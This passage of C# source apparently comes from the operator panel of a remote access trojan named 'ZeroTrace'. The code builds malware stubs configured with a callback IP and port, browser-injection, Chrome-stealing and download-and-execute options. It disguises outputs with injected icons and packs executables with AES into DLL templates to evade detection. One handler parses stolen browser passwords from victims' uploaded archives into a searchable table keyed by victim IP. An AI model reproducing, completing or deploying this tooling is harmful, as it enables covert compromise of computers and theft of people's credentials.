                                AppendColoredText(richTextBox2, "✓ Download & Execute URL: ", Color.LightGreen);
                                AppendColoredText(richTextBox2, $"{downloadexecute}\n", Color.White);
                            }
                            else
                            {
                                AppendColoredText(richTextBox2, "❌ ERROR: Invalid link. Must start with http:// or https://\n", Color.Red);
                                MessageBox.Show("Invalid link. Must start with http:// or https://");
                                return;
                            }
                        }
                        else
                        {
                            AppendColoredText(richTextBox2, "❌ Download & Execute canceled by user\n", Color.Red);
                            return;
                        }
                    }
                }
                else
                {
                    AppendColoredText(richTextBox2, "✓ Download & Execute: ", Color.LightGreen);
                    AppendColoredText(richTextBox2, "DISABLED\n", Color.Gray);
                }
                // Start build process
                AppendColoredText(richTextBox2, "\n⚙️ Starting build process...\n", Color.Yellow);
                AppendProgressBar(richTextBox2, 0);

                // Build stages simulation with progress updates
                for (int i = 1; i <= 10; i++)
                {
                    string stage;

                    switch (i)
                    {
                        case 1:
                            stage = "Loading base stub...";
                            break;
                        case 2:
                            stage = "Reading resources...";
                            break;
                        case 3:
                            stage = "Preparing build environment...";
                            break;
                        case 4:
                            stage = "Configuring connection settings...";
                            break;
                        case 5:
                            stage = "Setting up injection options...";
                            break;
                        case 6:
                            stage = "Configuring chrome module...";
                            break;
                        case 7:
                            stage = "Setting up payload...";
                            break;
                        case 8:
                            stage = "Compiling components...";
                            break;
                        case 9:
                            stage = "Finalizing build...";
                            break;
                        case 10:
                            stage = "Saving executable...";
                            break;
                        default:
                            stage = "Processing...";
                            break;
                    }

                    AppendColoredText(richTextBox2, $"[{i}/10] ", Color.Orange);
                    AppendColoredText(richTextBox2, $"{stage}\n", Color.White);
                    AppendProgressBar(richTextBox2, i * 10);

                    // Use Application.DoEvents to refresh the UI
                    Application.DoEvents();
                    Thread.Sleep(200); // Small delay to make progress visible
                }
                // Call the actual build
                AppendColoredText(richTextBox2, "\n⚙️ Finalizing build...\n", Color.Yellow);
                ZeroTrace.Builder.Build.ModifyAndSaveAssembly(textEdit4.Text, textEdit3.Text, injValue, chrome, downloadexecute, output);

                // Build completed
                AppendColoredText(richTextBox2, "\n✅ BUILD SUCCESSFUL! ✅\n", Color.LimeGreen);
                AppendColoredText(richTextBox2, "📂 Output: ", Color.White);
                AppendColoredText(richTextBox2, $"{output}\n", Color.Yellow);

                // Add build configuration summary
                AppendColoredText(richTextBox2, "\n📋 Build Configuration Summary:\n", Color.Cyan);
                AppendColoredText(richTextBox2, "  • IP: ", Color.White);
                AppendColoredText(richTextBox2, $"{textEdit4.Text}\n", Color.LightBlue);
                AppendColoredText(richTextBox2, "  • Port: ", Color.White);
                AppendColoredText(richTextBox2, $"{textEdit3.Text}\n", Color.LightBlue);
                AppendColoredText(richTextBox2, "  • Injection: ", Color.White);
                AppendColoredText(richTextBox2, $"{(injValue == "1" ? "Enabled" : "Disabled")}\n", Color.LightBlue);
                AppendColoredText(richTextBox2, "  • Chrome Module: ", Color.White);
                AppendColoredText(richTextBox2, $"{(chrome == "1" ? "Enabled" : "Disabled")}\n", Color.LightBlue);
                AppendColoredText(richTextBox2, "  • Download & Execute: ", Color.White);
                AppendColoredText(richTextBox2, $"{(downloadexecute != "0" ? downloadexecute : "Disabled")}\n", Color.LightBlue);

                AppendColoredText(richTextBox2, "\n⏱️ Build completed at: ", Color.White);
                AppendColoredText(richTextBox2, $"{DateTime.Now:yyyy-MM-dd HH:mm:ss}\n", Color.LightGreen);

                // Show success message
                MessageBox.Show(
                    "Build completed successfully!\n\n" +
                    "• Output: " + output + "\n",
                    "Build Success",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information
                );


                if (checkEdit4.Checked && !string.IsNullOrEmpty(OpenFileDialogIcon))
                {
                    AppendColoredText(richTextBox2, "⚙️ Injecting custom icon...\n", Color.Yellow);
                    try
                    {
                        Server.Helper.IconInjector.InjectIcon(output, OpenFileDialogIcon);
                        AppendColoredText(richTextBox2, "✓ Custom icon injected successfully\n", Color.LightGreen);
                    }
                    catch (Exception iconEx)
                    {
                        AppendColoredText(richTextBox2, $"⚠️ Warning: Failed to inject icon: {iconEx.Message}\n", Color.Orange);
                        // Continue with build even if icon injection fails
                    }
                }
            }
            catch (Exception ex)
            {
                AppendColoredText(richTextBox2, "\n❌ BUILD FAILED! ❌\n", Color.Red);
                AppendColoredText(richTextBox2, $"Error: {ex.Message}\n", Color.Red);
                AppendColoredText(richTextBox2, $"Stack Trace: {ex.StackTrace}\n", Color.DarkGray);

                MessageBox.Show($"Build Failed: {ex.Message}");
            }
        }
        private void AppendColoredText(RichTextBox box, string text, Color color)
        {
            box.SelectionStart = box.TextLength;
            box.SelectionLength = 0;
            box.SelectionColor = color;
            box.AppendText(text);
            box.SelectionColor = box.ForeColor;

            // Auto-scroll to the end
            box.ScrollToCaret();
        }

        // Helper method to create a text-based progress bar
        private void AppendProgressBar(RichTextBox box, int percentComplete)
        {
            int barWidth = 50;
            int completedWidth = (int)(barWidth * percentComplete / 100.0);

            StringBuilder sb = new StringBuilder();
            sb.Append('[');

            for (int i = 0; i < barWidth; i++)
            {
                if (i < completedWidth)
                    sb.Append('█');
                else
                    sb.Append('░');
            }

            sb.Append(']');
            sb.Append($" {percentComplete}%");
            sb.Append("\n");

            AppendColoredText(box, sb.ToString(), percentComplete == 100 ? Color.LightGreen : Color.Orange);
        }

        private void panelControl18_Paint(object sender, PaintEventArgs e)
        {

        }

        private void checkEdit4_CheckedChanged(object sender, EventArgs e)
        {
            if (checkEdit4.Checked)
            {
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Filter = "Icon Files (*.ico)|*.ico";
                    openFileDialog.Title = "Select Icon File";
                    openFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        OpenFileDialogIcon = openFileDialog.FileName;
                        AppendColoredText(richTextBox2, "✓ Custom Icon: ", Color.LightGreen);
                        AppendColoredText(richTextBox2, $"{Path.GetFileName(OpenFileDialogIcon)}\n", Color.White);

                        textEdit5.Text = Path.GetFileName(OpenFileDialogIcon);
                    }
                    else
                    {
                        // User cancelled dialog, uncheck the checkbox
                        checkEdit4.Checked = false;
                        AppendColoredText(richTextBox2, "❌ Custom icon selection cancelled\n", Color.Red);
                    }
                }
            }
            else
            {
                // Checkbox unchecked, clear the icon path
                OpenFileDialogIcon = string.Empty;
                AppendColoredText(richTextBox2, "✓ Custom Icon: ", Color.LightGreen);
                AppendColoredText(richTextBox2, "DEFAULT\n", Color.Gray);
            }
        }

        private void simpleButton7_Click(object sender, EventArgs e)
        {
            try
            {
                // Clear the terminal output
                richTextBox3.Clear();
                AppendColoredText(richTextBox3, "⚙️ Starting executable packaging process...\n", Color.Yellow);

                // Ask user to select the executable to encrypt
                string executablePath = string.Empty;
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Filter = "Executable files (*.exe)|*.exe";
                    openFileDialog.Title = "Select Executable to Encrypt";

                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        executablePath = openFileDialog.FileName;
                        AppendColoredText(richTextBox3, "✓ Selected executable: ", Color.LightGreen);
                        AppendColoredText(richTextBox3, $"{executablePath}\n", Color.White);
                    }
                    else
                    {
                        AppendColoredText(richTextBox3, "❌ Operation cancelled by user\n", Color.Red);
                        return;
                    }
                }

                // Generate random encryption key
                AppendColoredText(richTextBox3, "⚙️ Generating encryption key...\n", Color.Yellow);
                byte[] key = new byte[32]; // 256-bit key for AES
                using (var rng = new System.Security.Cryptography.RNGCryptoServiceProvider())
                {
                    rng.GetBytes(key);
                }
                string base64Key = Convert.ToBase64String(key);
                AppendColoredText(richTextBox3, "✓ Encryption key generated\n", Color.LightGreen);

                // Read the executable file
                AppendColoredText(richTextBox3, "⚙️ Reading executable file...\n", Color.Yellow);
                byte[] executableBytes = File.ReadAllBytes(executablePath);
                AppendColoredText(richTextBox3, $"✓ Read {executableBytes.Length:N0} bytes\n", Color.LightGreen);

                // Encrypt the executable
                AppendColoredText(richTextBox3, "⚙️ Encrypting executable with AES-256...\n", Color.Yellow);
                byte[] encryptedData = EncryptData(executableBytes, key);
                AppendColoredText(richTextBox3, $"✓ Encrypted size: {encryptedData.Length:N0} bytes\n", Color.LightGreen);

                // Ask for the DLL template path
                string dllTemplatePath = string.Empty;
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Filter = "DLL files (*.dll)|*.dll";
                    openFileDialog.Title = "Select DLL Template";

                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        dllTemplatePath = openFileDialog.FileName;
                        AppendColoredText(richTextBox3, "✓ Selected DLL template: ", Color.LightGreen);
                        AppendColoredText(richTextBox3, $"{dllTemplatePath}\n", Color.White);
                    }
                    else
                    {
                        AppendColoredText(richTextBox3, "❌ Operation cancelled by user\n", Color.Red);
                        return;
                    }
                }

                // Create output path for the modified DLL
                string outputPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                    $"Packed_{RandomStringGenerator.Generate(8)}.dll");

                // Embed resources in the DLL
                AppendColoredText(richTextBox3, "⚙️ Embedding resources in DLL...\n", Color.Yellow);

                // First, copy the DLL template to the output location
                File.Copy(dllTemplatePath, outputPath, true);
                AppendColoredText(richTextBox3, "✓ Template DLL copied\n", Color.LightGreen);

                // Now add the resources using WinAPI
                AppendColoredText(richTextBox3, "⚙️ Adding encrypted data as resource...\n", Color.Yellow);
                if (UpdateResource(outputPath, "BINARY", "enc.bin", encryptedData))
                {
                    AppendColoredText(richTextBox3, "✓ Encrypted data embedded successfully\n", Color.LightGreen);
                }
                else
                {
                    throw new Exception("Failed to embed encrypted data");
                }

                AppendColoredText(richTextBox3, "⚙️ Adding encryption key as resource...\n", Color.Yellow);
                byte[] keyBytes = Encoding.UTF8.GetBytes(base64Key);
                if (UpdateResource(outputPath, "TEXT", "key.txt", keyBytes))
                {
                    AppendColoredText(richTextBox3, "✓ Encryption key embedded successfully\n", Color.LightGreen);
                }
                else
                {
                    throw new Exception("Failed to embed encryption key");
                }

                AppendColoredText(richTextBox3, "\n✅ PACKAGING COMPLETED! ✅\n", Color.LimeGreen);
                AppendColoredText(richTextBox3, "📂 Output DLL: ", Color.White);
                AppendColoredText(richTextBox3, $"{outputPath}\n", Color.Yellow);

                AppendColoredText(richTextBox3, "\n📋 Summary:\n", Color.Cyan);
                AppendColoredText(richTextBox3, "  • Original Size: ", Color.White);
                AppendColoredText(richTextBox3, $"{executableBytes.Length:N0} bytes\n", Color.LightBlue);
                AppendColoredText(richTextBox3, "  • Encrypted Size: ", Color.White);
                AppendColoredText(richTextBox3, $"{encryptedData.Length:N0} bytes\n", Color.LightBlue);
                AppendColoredText(richTextBox3, "  • Encryption: ", Color.White);
                AppendColoredText(richTextBox3, "AES-256\n", Color.LightBlue);

                // Show success message
                MessageBox.Show(
                    $"DLL package created successfully!\n\nOutput: {outputPath}",
                    "Packaging Complete",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information
                );
            }
            catch (Exception ex)
            {
                AppendColoredText(richTextBox3, "\n❌ PACKAGING FAILED! ❌\n", Color.Red);
                AppendColoredText(richTextBox3, $"Error: {ex.Message}\n", Color.Red);
                AppendColoredText(richTextBox3, $"Stack Trace: {ex.StackTrace}\n", Color.DarkGray);

                MessageBox.Show($"Error packaging executable: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

        }
        private byte[] EncryptData(byte[] data, byte[] key)
        {
            using (var aes = System.Security.Cryptography.Aes.Create())
            {
                aes.Key = key;
                aes.GenerateIV(); // Generate random IV

                using (var memoryStream = new MemoryStream())
                {
                    // First write the IV so we can retrieve it later
                    memoryStream.Write(aes.IV, 0, aes.IV.Length);

                    using (var cryptoStream = new CryptoStream(
                        memoryStream,
                        aes.CreateEncryptor(),
                        CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(data, 0, data.Length);
                        cryptoStream.FlushFinalBlock();
                    }

                    return memoryStream.ToArray();
                }
            }
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr BeginUpdateResource(string pFileName, [MarshalAs(UnmanagedType.Bool)] bool bDeleteExistingResources);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool UpdateResourceW(IntPtr hUpdate, string lpType, string lpName, ushort wLanguage, byte[] lpData, uint cbData);

        // Helper method to update a resource in a PE file
        private bool UpdateResource(string filePath, string type, string name, byte[] data)
        {
            // Begin the update session
            IntPtr hUpdate = BeginUpdateResource(filePath, false);
            if (hUpdate == IntPtr.Zero)
            {
                int error = Marshal.GetLastWin32Error();
                AppendColoredText(richTextBox3, $"❌ BeginUpdateResource failed with error: {error}\n", Color.Red);
                return false;
            }

            try
            {
                // Update the resource
                if (!UpdateResourceW(hUpdate, type, name, 0, data, (uint)data.Length))
                {
                    int error = Marshal.GetLastWin32Error();
                    AppendColoredText(richTextBox3, $"❌ UpdateResourceW failed with error: {error}\n", Color.Red);
                    EndUpdateResource(hUpdate, true); // Discard changes
                    return false;
                }

                // Commit the changes
                if (!EndUpdateResource(hUpdate, false))
                {
                    int error = Marshal.GetLastWin32Error();
                    AppendColoredText(richTextBox3, $"❌ EndUpdateResource failed with error: {error}\n", Color.Red);
                    return false;
                }

                return true;
            }
            catch (Exception ex)
            {
                AppendColoredText(richTextBox3, $"❌ Exception during resource update: {ex.Message}\n", Color.Red);
                EndUpdateResource(hUpdate, true); // Discard changes
                return false;
            }
        }
        private void simpleButton3_Click_1(object sender, EventArgs e)
        {
            try
            {
                // Create a DataTable to store the password entries
                DataTable passwordTable = new DataTable();
                passwordTable.Columns.Add("URL", typeof(string));
                passwordTable.Columns.Add("WebBrowser", typeof(string));
                passwordTable.Columns.Add("UserName", typeof(string));
                passwordTable.Columns.Add("Password", typeof(string));
                passwordTable.Columns.Add("Strength", typeof(string));
                passwordTable.Columns.Add("CreatedTime", typeof(string));
                passwordTable.Columns.Add("ClientIP", typeof(string));

                // Get the Clients folder path
                string clientsFolder = Path.Combine(Application.StartupPath, "Clients");
                if (!Directory.Exists(clientsFolder))
                {
                    MessageBox.Show("Clients folder not found!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                int totalPasswords = 0;
                int processedFolders = 0;
                int totalFolders = Directory.GetDirectories(clientsFolder).Length;

                // Show progress form
                using (Form progressForm = new Form())
                {
                    progressForm.Text = "Processing Password Files";
                    progressForm.Width = 400;
                    progressForm.Height = 150;
                    progressForm.FormBorderStyle = FormBorderStyle.FixedDialog;
                    progressForm.StartPosition = FormStartPosition.CenterScreen;
                    progressForm.MaximizeBox = false;
                    progressForm.MinimizeBox = false;
                    progressForm.ShowIcon = false;

                    Label statusLabel = new Label { Left = 20, Top = 20, Width = 360, Text = "Scanning client folders..." };
                    ProgressBar progressBar = new ProgressBar { Left = 20, Top = 50, Width = 360, Height = 20, Minimum = 0, Maximum = 100, Value = 0 };
                    Label countLabel = new Label { Left = 20, Top = 80, Width = 360, Text = "Found: 0 passwords" };

                    progressForm.Controls.Add(statusLabel);
                    progressForm.Controls.Add(progressBar);
                    progressForm.Controls.Add(countLabel);

                    // Start the processing in a background thread
                    Thread workerThread = new Thread(() =>
                    {
                        // Process each client folder
                        foreach (string clientFolder in Directory.GetDirectories(clientsFolder))
                        {
                            string clientIP = Path.GetFileName(clientFolder).Replace('_', '.');
                            statusLabel.Invoke((MethodInvoker)delegate {
                                statusLabel.Text = $"Processing client: {clientIP}";
                            });

                            // Find all zip files in the client folder
                            var zipFiles = Directory.GetFiles(clientFolder, "*.zip");
                            foreach (string zipFile in zipFiles)
                            {
                                try
                                {
                                    using (ZipArchive archive = ZipFile.OpenRead(zipFile))
                                    {
                                        // Find password files in the zip - UPDATED to match your actual filenames
                                        var passwordEntries = archive.Entries.Where(entry =>
                                            entry.Name.Equals("ChromeV20Passwords.txt", StringComparison.OrdinalIgnoreCase) ||
                                            entry.Name.Equals("GetAllPasswords.txt", StringComparison.OrdinalIgnoreCase));

                                        foreach (var entry in passwordEntries)
                                        {
                                            using (StreamReader reader = new StreamReader(entry.Open()))
                                            {
                                                string line;
                                                Dictionary<string, string> currentEntry = null;

                                                while ((line = reader.ReadLine()) != null)
                                                {
                                                    if (line == "==================================================")
                                                    {
                                                        // Start of a new entry or end of current entry
                                                        if (currentEntry != null && currentEntry.Count > 0)
                                                        {
                                                            // Add completed entry to our DataTable
                                                            DataRow row = passwordTable.NewRow();

                                                            row["URL"] = currentEntry.ContainsKey("URL") ? currentEntry["URL"].Trim() : "";
                                                            row["WebBrowser"] = currentEntry.ContainsKey("Web Browser") ? currentEntry["Web Browser"].Trim() : "";
                                                            row["UserName"] = currentEntry.ContainsKey("User Name") ? currentEntry["User Name"].Trim() : "";
                                                            row["Password"] = currentEntry.ContainsKey("Password") ? currentEntry["Password"].Trim() : "";
                                                            row["Strength"] = currentEntry.ContainsKey("Password Strength") ? currentEntry["Password Strength"].Trim() : "";
                                                            row["CreatedTime"] = currentEntry.ContainsKey("Created Time") ? currentEntry["Created Time"].Trim() : "";
                                                            row["ClientIP"] = clientIP;

                                                            passwordTable.Rows.Add(row);
                                                            totalPasswords++;

                                                            // Update count label
                                                            countLabel.Invoke((MethodInvoker)delegate {
                                                                countLabel.Text = $"Found: {totalPasswords} passwords";
                                                            });
                                                        }

                                                        // Start a new entry
                                                        currentEntry = new Dictionary<string, string>();
                                                    }
                                                    else if (currentEntry != null && line.Contains(":"))
                                                    {
                                                        // Parse key-value pairs
                                                        int colonIndex = line.IndexOf(':');
                                                        if (colonIndex > 0)
                                                        {
                                                            string key = line.Substring(0, colonIndex).Trim();
                                                            string value = line.Substring(colonIndex + 1).Trim();
                                                            currentEntry[key] = value;
                                                        }
                                                    }
                                                }

                                                // Handle the last entry if there is one
                                                if (currentEntry != null && currentEntry.Count > 0)
                                                {
                                                    DataRow row = passwordTable.NewRow();

                                                    row["URL"] = currentEntry.ContainsKey("URL") ? currentEntry["URL"].Trim() : "";
                                                    row["WebBrowser"] = currentEntry.ContainsKey("Web Browser") ? currentEntry["Web Browser"].Trim() : "";
                                                    row["UserName"] = currentEntry.ContainsKey("User Name") ? currentEntry["User Name"].Trim() : "";
                                                    row["Password"] = currentEntry.ContainsKey("Password") ? currentEntry["Password"].Trim() : "";
                                                    row["Strength"] = currentEntry.ContainsKey("Password Strength") ? currentEntry["Password Strength"].Trim() : "";
                                                    row["CreatedTime"] = currentEntry.ContainsKey("Created Time") ? currentEntry["Created Time"].Trim() : "";
                                                    row["ClientIP"] = clientIP;

                                                    passwordTable.Rows.Add(row);
                                                    totalPasswords++;

                                                    // Update count label
                                                    countLabel.Invoke((MethodInvoker)delegate {
                                                        countLabel.Text = $"Found: {totalPasswords} passwords";
                                                    });
                                                }
                                            }
                                        }
                                    }
                                }
                                catch (Exception zipEx)
                                {
                                    // Log error but continue processing
                                    Console.WriteLine($"Error processing zip file {zipFile}: {zipEx.Message}");
                                }
                            }

                            processedFolders++;
                            int progressValue = (int)((float)processedFolders / totalFolders * 100);

                            // Update progress bar
                            progressBar.Invoke((MethodInvoker)delegate {
                                progressBar.Value = progressValue;
                            });
                        }

                        // Signal completion and close the progress form
                        progressForm.Invoke((MethodInvoker)delegate {
                            progressForm.DialogResult = DialogResult.OK;
                        });
                    });

                    workerThread.IsBackground = true;
                    workerThread.Start();

                    // Show the form and wait for completion
                    if (progressForm.ShowDialog() == DialogResult.OK)
                    {
                        // Display the results in the grid
                        gridControl2.DataSource = passwordTable;

                        // Configure grid view for better visualization
                        var gridView = gridControl2.MainView as DevExpress.XtraGrid.Views.Grid.GridView;
                        if (gridView != null)
                        {
                            // Auto-size columns
                            gridView.BestFitColumns();

                            // Add column sorting
                            foreach (DevExpress.XtraGrid.Columns.GridColumn column in gridView.Columns)
                            {
                                column.SortMode = DevExpress.XtraGrid.ColumnSortMode.Value;
                            }

                            // Set up search functionality with textEdit2 to search in multiple columns
                            textEdit2.TextChanged += (sender2, args) =>
                            {
                                string searchText = textEdit2.Text.ToLowerInvariant();

                                if (string.IsNullOrWhiteSpace(searchText))
                                {
                                    // Clear filter if search box is empty
                                    gridView.ClearColumnsFilter();
                                }
                                else
                                {
                                    // Filter in URL, UserName, and Password columns
                                    gridView.ActiveFilterString =
                                        $"[URL] LIKE '%{searchText}%' OR " +
                                        $"[UserName] LIKE '%{searchText}%' OR " +
                                        $"[Password] LIKE '%{searchText}%'";
                                }
                            };
                        }

                        if (totalPasswords > 0)
                        {
                            // Show result information
                            MessageBox.Show(
                                $"Password scan completed!\n\nFound {totalPasswords} passwords from {totalFolders} clients.",
                                "Scan Results",
                                MessageBoxButtons.OK,
                                MessageBoxIcon.Information
                            );
                        }
                        else
                        {
                            MessageBox.Show(
                                "No passwords found. Please check that files exist inside the client ZIP files.",
                                "Scan Results",
                                MessageBoxButtons.OK,
                                MessageBoxIcon.Information
                            );
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error processing password files: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void simpleButton4_Click(object sender, EventArgs e)
        {
            try
            {
                // Setup the file manager using DevExpress grid properly
                string clientsFolder = Path.Combine(Application.StartupPath, "Clients");
                if (!Directory.Exists(clientsFolder))
                {
                    MessageBox.Show("Clients folder not found!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                // Set up file manager if not already done
                SetupFileManager();

                // Navigate to Clients folder
                NavigateToFolder(clientsFolder);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error initializing file manager: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void accordionControlElement2_Click(object sender, EventArgs e)
        {
            xtraTabPage1.TabControl.SelectedTabPageIndex = 0;
        }

        private void accordionControlElement3_Click(object sender, EventArgs e)
        {
            xtraTabPage1.TabControl.SelectedTabPageIndex = 1;
        }

        private void accordionControlElement4_Click(object sender, EventArgs e)
        {
            xtraTabPage1.TabControl.SelectedTabPageIndex = 2;
        }

        private void accordionControlElement6_Click(object sender, EventArgs e)
        {
            xtraTabPage1.TabControl.SelectedTabPageIndex = 4;
        }

        private void accordionControlElement7_Click(object sender, EventArgs e)
        {
            xtraTabPage1.TabControl.SelectedTabPageIndex = 5;
        }

        private void accordionControlElement13_Click(object sender, EventArgs e)
        {
            xtraTabPage1.TabControl.SelectedTabPageIndex = 8;
        }

        private void accordionControlElement8_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Only Members Allowed.");
        }

        private void accordionControlElement10_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Only Members Allowed.");
        }

        private void accordionControlElement11_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Only Members Allowed.");
        }
    }

}


namespace ZeroTrace.Builder
{


    internal sealed class Build
    {



        private static AssemblyDefinition ReadStub(string stubPath)
        {
            if (!File.Exists(stubPath))
                throw new FileNotFoundException("Stub file not found.", stubPath);

            return AssemblyDefinition.ReadAssembly(stubPath);
        }

        private static void WriteStub(AssemblyDefinition definition, string outputPath)
        {
            definition.Write(outputPath);
        }





        private static void UpdateResource(string resourceName, string newContent, AssemblyDefinition assembly)
        {
            // Find the existing resource by name
            var existingResource = assembly.MainModule.Resources.OfType<EmbeddedResource>()
                                    .FirstOrDefault(r => r.Name.Equals(resourceName));

            if (existingResource != null)
            {
                // Remove the existing resource
                assembly.MainModule.Resources.Remove(existingResource);
            }

            // Add the new resource
            var newResource = new EmbeddedResource(resourceName, Mono.Cecil.ManifestResourceAttributes.Public, Encoding.UTF8.GetBytes(newContent));
            assembly.MainModule.Resources.Add(newResource);
        }

        public static void UpdateIPAndPort(string newIP, string newPort, string injValue, string chrome, string downloadexecute, AssemblyDefinition assembly)
        {
            // Remove and add the IP and Port resources
            UpdateResource("ZeroTraceOfficialStub.Resources.ip.txt", newIP, assembly);
            UpdateResource("ZeroTraceOfficialStub.Resources.port.txt", newPort, assembly);

            // Add the injection resource
            UpdateResource("ZeroTraceOfficialStub.Resources.inj.txt", injValue, assembly);

            UpdateResource("ZeroTraceOfficialStub.Resources.uac.txt", chrome, assembly);

            UpdateResource("ZeroTraceOfficialStub.Resources.downloadexecute.txt", downloadexecute, assembly);

        }


        //public static void ModifyObfuscatedAssembly(string newIP, string newPort, string outputPath)
        //{
        //    try
        //    {
        //        string stubPath = Environment.CurrentDirectory + "\\Stub\\DestinyClientObf.exe";

        //        Console.WriteLine(stubPath);
        //        Console.ReadLine();
        //        // Read the stub assembly
        //        var assembly = ReadStub(stubPath);

        //        // Update the IP and Port resources
        //        UpdateIPAndPort(newIP, newPort, assembly);

        //        // Write the modified assembly to a file
        //        WriteStub(assembly, outputPath);
        //    }
        //    catch (Exception ex)
        //    {
        //        throw new Exception($"Failed to modify assembly: {ex.Message}");
        //    }
        //}


        public static void ModifyAndSaveAssembly(string newIP, string newPort, string injValue, string chrome, string downloadexecute, string outputPath)
        {
            try
            {
                string stubPath = Environment.CurrentDirectory + "\\Stub\\ZeroStub.exe";
                Console.WriteLine(stubPath);
                Console.ReadLine();
                // Read the stub assembly
                var assembly = ReadStub(stubPath);
                // Update the IP, Port and injection setting resources
                UpdateIPAndPort(newIP, newPort, injValue, chrome,  downloadexecute, assembly);
                // Write the modified assembly to a file
                WriteStub(assembly, outputPath);
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to modify assembly: {ex.Message}");
            }
        }
    }

}
namespace Server.Helper
{
    public static class IconInjector
    {
        

        [SuppressUnmanagedCodeSecurity()]
        private class NativeMethods
        {
            [DllImport("kernel32")]
            public static extern IntPtr BeginUpdateResource(string fileName,
                [MarshalAs(UnmanagedType.Bool)] bool deleteExistingResources);

            [DllImport("kernel32")]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool UpdateResource(IntPtr hUpdate, IntPtr type, IntPtr name, short language,
                [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 5)] byte[] data, int dataSize);

            [DllImport("kernel32")]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool EndUpdateResource(IntPtr hUpdate, [MarshalAs(UnmanagedType.Bool)] bool discard);
        }

        // The first structure in an ICO file lets us know how many images are in the file.
        [StructLayout(LayoutKind.Sequential)]
        private struct ICONDIR
        {
            // Reserved, must be 0
            public ushort Reserved;
            // Resource type, 1 for icons.
            public ushort Type;
            // How many images.
            public ushort Count;
            // The native structure has an array of ICONDIRENTRYs as a final field.
        }

        // Each ICONDIRENTRY describes one icon stored in the ico file. The offset says where the icon image data
        // starts in the file. The other fields give the information required to turn that image data into a valid
        // bitmap.
        [StructLayout(LayoutKind.Sequential)]
        private struct ICONDIRENTRY
        {
            /// <summary>
            /// The width, in pixels, of the image.
            /// </summary>
            public byte Width;
            /// <summary>
            /// The height, in pixels, of the image.
            /// </summary>
            public byte Height;
            /// <summary>
            /// The number of colors in the image; (0 if >= 8bpp)
            /// </summary>
            public byte ColorCount;
            /// <summary>
            /// Reserved (must be 0).
            /// </summary>
            public byte Reserved;
            /// <summary>
            /// Color planes.
            /// </summary>
            public ushort Planes;
            /// <summary>
            /// Bits per pixel.
            /// </summary>
            public ushort BitCount;
            /// <summary>
            /// The length, in bytes, of the pixel data.
            /// </summary>
            public int BytesInRes;
            /// <summary>
            /// The offset in the file where the pixel data starts.
            /// </summary>
            public int ImageOffset;
        }

        // Each image is stored in the file as an ICONIMAGE structure:
        //typdef struct
        //{
        //   BITMAPINFOHEADER   icHeader;      // DIB header
        //   RGBQUAD         icColors[1];   // Color table
        //   BYTE            icXOR[1];      // DIB bits for XOR mask
        //   BYTE            icAND[1];      // DIB bits for AND mask
        //} ICONIMAGE, *LPICONIMAGE;


        [StructLayout(LayoutKind.Sequential)]
        private struct BITMAPINFOHEADER
        {
            public uint Size;
            public int Width;
            public int Height;
            public ushort Planes;
            public ushort BitCount;
            public uint Compression;
            public uint SizeImage;
            public int XPelsPerMeter;
            public int YPelsPerMeter;
            public uint ClrUsed;
            public uint ClrImportant;
        }

        // The icon in an exe/dll file is stored in a very similar structure:
        [StructLayout(LayoutKind.Sequential, Pack = 2)]
        private struct GRPICONDIRENTRY
        {
            public byte Width;
            public byte Height;
            public byte ColorCount;
            public byte Reserved;
            public ushort Planes;
            public ushort BitCount;
            public int BytesInRes;
            public ushort ID;
        }

        public static void InjectIcon(string exeFileName, string iconFileName)
        {
            InjectIcon(exeFileName, iconFileName, 1, 1);
        }

        public static void InjectIcon(string exeFileName, string iconFileName, uint iconGroupID, uint iconBaseID)
        {
            const uint RT_ICON = 3u;
            const uint RT_GROUP_ICON = 14u;
            IconFile iconFile = IconFile.FromFile(iconFileName);
            var hUpdate = NativeMethods.BeginUpdateResource(exeFileName, false);
            var data = iconFile.CreateIconGroupData(iconBaseID);
            NativeMethods.UpdateResource(hUpdate, new IntPtr(RT_GROUP_ICON), new IntPtr(iconGroupID), 0, data,
                data.Length);
            for (int i = 0; i <= iconFile.ImageCount - 1; i++)
            {
                var image = iconFile.ImageData(i);
                NativeMethods.UpdateResource(hUpdate, new IntPtr(RT_ICON), new IntPtr(iconBaseID + i), 0, image,
                    image.Length);
            }
            NativeMethods.EndUpdateResource(hUpdate, false);
        }

        private class IconFile
        {
            private ICONDIR iconDir = new ICONDIR();
            private ICONDIRENTRY[] iconEntry;

            private byte[][] iconImage;

            public int ImageCount
            {
                get { return iconDir.Count; }
            }

            public byte[] ImageData(int index)
            {
                return iconImage[index];
            }

            public static IconFile FromFile(string filename)
            {
                IconFile instance = new IconFile();
